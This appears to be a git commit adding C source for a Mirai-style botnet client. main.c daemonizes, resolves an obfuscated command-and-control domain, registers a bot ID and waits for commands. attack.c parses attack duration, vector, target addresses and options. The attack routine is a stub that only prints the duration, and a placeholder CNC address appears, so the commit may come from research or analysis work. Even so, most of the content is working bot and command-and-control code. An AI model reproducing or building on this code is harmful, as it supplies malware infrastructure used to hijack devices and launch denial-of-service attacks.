1d9eced3a09fc78384e54ba024e4d7a2582e7469
s's txyun <sldx000@sjtu.edu.cn>
2023-02-16 13:02:41 +0800

    first commit

---
+++ attack.c
@@ -0,0 +1,126 @@
+#define _GNU_SOURCE
+
+#ifdef DEBUG
+#include <stdio.h>
+#endif
+#include <stdlib.h>
+#include <unistd.h>
+#include <signal.h>
+#include <errno.h>
+
+#include "includes.h"
+#include "attack.h"
+
+
+void attack_parse(char *buf, int len)
+{
+    int i;
+    uint32_t duration;
+    ATTACK_VECTOR vector;
+    uint8_t targs_len, opts_len;
+    struct attack_target *targs = NULL;
+    struct attack_option *opts = NULL;
+
+    // Read in attack duration uint32_t
+    if (len < sizeof (uint32_t))
+        goto cleanup;
+    duration = ntohl(*((uint32_t *)buf));
+    buf += sizeof (uint32_t);
+    len -= sizeof (uint32_t);
+
+    // Read in attack ID uint8_t
+    if (len == 0)
+        goto cleanup;
+    vector = (ATTACK_VECTOR)*buf++;
+    len -= sizeof (uint8_t);
+
+    // Read in target count uint8_t
+    if (len == 0)
+        goto cleanup;
+    targs_len = (uint8_t)*buf++;
+    len -= sizeof (uint8_t);
+    if (targs_len == 0)
+        goto cleanup;
+
+    // Read in all targs
+    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
+        goto cleanup;
+    targs = calloc(targs_len, sizeof (struct attack_target));
+    for (i = 0; i < targs_len; i++)
+    {
+        targs[i].addr = *((ipv4_t *)buf);
+        buf += sizeof (ipv4_t);
+        targs[i].netmask = (uint8_t)*buf++;
+        len -= (sizeof (ipv4_t) + sizeof (uint8_t));
+
+        targs[i].sock_addr.sin_family = AF_INET;
+        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
+    }
+
+    // Read in flag count uint8_t
+    if (len < sizeof (uint8_t))
+        goto cleanup;
+    opts_len = (uint8_t)*buf++;
+    len -= sizeof (uint8_t);
+
+    // Read in all opts
+    if (opts_len > 0)
+    {
+        opts = calloc(opts_len, sizeof (struct attack_option));
+        for (i = 0; i < opts_len; i++)
+        {
+            uint8_t val_len;
+
+            // Read in key uint8
+            if (len < sizeof (uint8_t))
+                goto cleanup;
+            opts[i].key = (uint8_t)*buf++;
+            len -= sizeof (uint8_t);
+
+            // Read in data length uint8
+            if (len < sizeof (uint8_t))
+                goto cleanup;
+            val_len = (uint8_t)*buf++;
+            len -= sizeof (uint8_t);
+
+            if (len < val_len)
+                goto cleanup;
+            opts[i].val = calloc(val_len + 1, sizeof (char));
+            util_memcpy(opts[i].val, buf, val_len);
+            buf += val_len;
+            len -= val_len;
+        }
+    }
+
+    errno = 0;
+    attack_analysis(duration, vector, targs_len, targs, opts_len, opts);
+
+    // Cleanup
+    cleanup:
+    if (targs != NULL)
+        free(targs);
+    if (opts != NULL)
+        free_opts(opts, opts_len);
+}
+
+void attack_analysis(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    printf("[analysis] duration: %d\n", duration);
+    
+
+}
+
+static void free_opts(struct attack_option *opts, int len)
+{
+    int i;
+
+    if (opts == NULL)
+        return;
+
+    for (i = 0; i < len; i++)
+    {
+        if (opts[i].val != NULL)
+            free(opts[i].val);
+    }
+    free(opts);
+}
---
+++ main.c
@@ -0,0 +1,280 @@
+#define _GNU_SOURCE
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <sys/prctl.h>
+#include <sys/select.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <time.h>
+#include <errno.h>
+
+#include "includes.h"
+#include "table.h"
+#include "rand.h"
+#include "attack.h"
+#include "util.h"
+#include "resolv.h"
+
+static void establish_connection(void);
+static void teardown_connection(void);
+static void resolve_cnc_addr(void);
+
+struct sockaddr_in srv_addr; //haven't put in the cnc address yet
+int fd_serv = -1;
+BOOL pending_connection = FALSE;
+
+int main(int argc, char **args)
+{
+    char name_buf[32];
+    char id_buf[32];
+    int name_buf_len;
+    int pgid, pings = 0;
+
+    LOCAL_ADDR = util_local_addr();
+    srv_addr.sin_family = AF_INET;
+    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
+    srv_addr.sin_port = htons(FAKE_CNC_PORT);
+
+    //initial part
+    rand_init();
+    util_zero(id_buf, 32);
+    if (argc == 2 && util_strlen(args[1]) < 32)
+    {
+        util_strcpy(id_buf, args[1]);
+        util_zero(args[1], util_strlen(args[1]));
+    }
+
+#ifndef DEBUG
+    if (fork() > 0)
+        return 0;
+    pgid = setsid();
+    close(STDIN);
+    close(STDOUT);
+    close(STDERR);
+#endif
+
+    while (TRUE)
+    {
+        fd_set fdsetrd, fdsetwr, fdsetex;
+        struct timeval timeo;
+        int mfd, nfds;
+
+        FD_ZERO(&fdsetrd);
+        FD_ZERO(&fdsetwr);
+
+        // Set up CNC sockets
+        if (fd_serv == -1)
+            establish_connection();
+
+        if (pending_connection)
+            FD_SET(fd_serv, &fdsetwr);
+        else
+            FD_SET(fd_serv, &fdsetrd);
+
+        mfd = fd_serv;
+
+        // Wait 10s in call to select()
+        timeo.tv_usec = 0;
+        timeo.tv_sec = 10;
+        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
+        if (nfds == -1)
+        {
+#ifdef DEBUG
+            printf("select() errno = %d\n", errno);
+#endif
+            continue;
+        }
+        else if (nfds == 0)
+        {
+            uint16_t len = 0;
+
+            if (pings++ % 6 == 0)
+                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+        } 
+
+        // Check if CNC connection was established or timed out or errored
+        if (pending_connection)
+        {
+            pending_connection = FALSE;
+
+            if (!FD_ISSET(fd_serv, &fdsetwr))
+            {
+#ifdef DEBUG
+                printf("[main] Timed out while connecting to CNC\n");
+#endif
+                teardown_connection();
+            }
+            else
+            {
+                int err = 0;
+                socklen_t err_len = sizeof (err);
+
+                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
+                if (err != 0)
+                {
+#ifdef DEBUG
+                    printf("[main] Error while connecting to CNC code=%d\n", err);
+#endif
+                    close(fd_serv);
+                    fd_serv = -1;
+                    sleep((rand_next() % 10) + 1);
+                }
+                else
+                {
+                    uint8_t id_len = util_strlen(id_buf);
+
+                    LOCAL_ADDR = util_local_addr();
+                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
+                    if (id_len > 0)
+                    {
+                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
+                    }
+#ifdef DEBUG
+                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
+#endif
+                }
+            }
+        }
+        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
+        {
+            int n;
+            uint16_t len;
+            char rdbuf[1024];
+
+            // Try to read in buffer length from CNC
+            errno = 0;
+            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
+            if (n == -1)
+            {
+                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
+                    continue;
+                else
+                    n = 0; // Cause connection to close
+            }
+            
+            // If n == 0 then we close the connection!
+            if (n == 0)
+            {
+#ifdef DEBUG
+                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
+#endif
+                teardown_connection();
+                continue;
+            }
+
+            // Convert length to network order and sanity check length
+            if (len == 0) // If it is just a ping, no need to try to read in buffer data
+            {
+                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
+                continue;
+            }
+            len = ntohs(len);
+            if (len > sizeof (rdbuf))
+            {
+                close(fd_serv);
+                fd_serv = -1;
+            }
+
+            // Try to read in buffer from CNC
+            errno = 0;
+            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
+            if (n == -1)
+            {
+                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
+                    continue;
+                else
+                    n = 0;
+            }
+
+            // If n == 0 then we close the connection!
+            if (n == 0)
+            {
+#ifdef DEBUG
+                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
+#endif
+                teardown_connection();
+                continue;
+            }
+
+            // Actually read buffer length and buffer data
+            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+            len = ntohs(len);
+            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
+
+#ifdef DEBUG
+            printf("[main] Received %d bytes from CNC\n", len);
+#endif
+
+            if (len > 0)
+                attack_parse(rdbuf, len);
+        }
+    }
+
+    return 0;
+}
+
+static void establish_connection(void)
+{
+#ifdef DEBUG
+    printf("[main] Attempting to connect to CNC\n");
+#endif
+
+    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+#ifdef DEBUG
+        printf("[main] Failed to call socket(). Errno = %d\n", errno);
+#endif
+        return;
+    }
+
+    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
+
+    // Should call resolve_cnc_addr
+    resolve_cnc_addr();
+
+    pending_connection = TRUE;
+    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
+}
+
+static void teardown_connection(void)
+{
+#ifdef DEBUG
+    printf("[main] Tearing down connection to CNC!\n");
+#endif
+
+    if (fd_serv != -1)
+        close(fd_serv);
+    fd_serv = -1;
+    sleep(1);
+}
+
+static void resolve_cnc_addr(void)
+{
+    struct resolv_entries *entries;
+
+    table_unlock_val(TABLE_CNC_DOMAIN);
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    table_lock_val(TABLE_CNC_DOMAIN);
+    if (entries == NULL)
+    {
+#ifdef DEBUG
+        printf("[main] Failed to resolve CNC address\n");
+#endif
+        return;
+    }
+    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    resolv_entries_free(entries);
+
+    table_unlock_val(TABLE_CNC_PORT);
+    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
+    table_lock_val(TABLE_CNC_PORT);
+
+#ifdef DEBUG
+    printf("[main] Resolved domain\n");
+#endif
+}
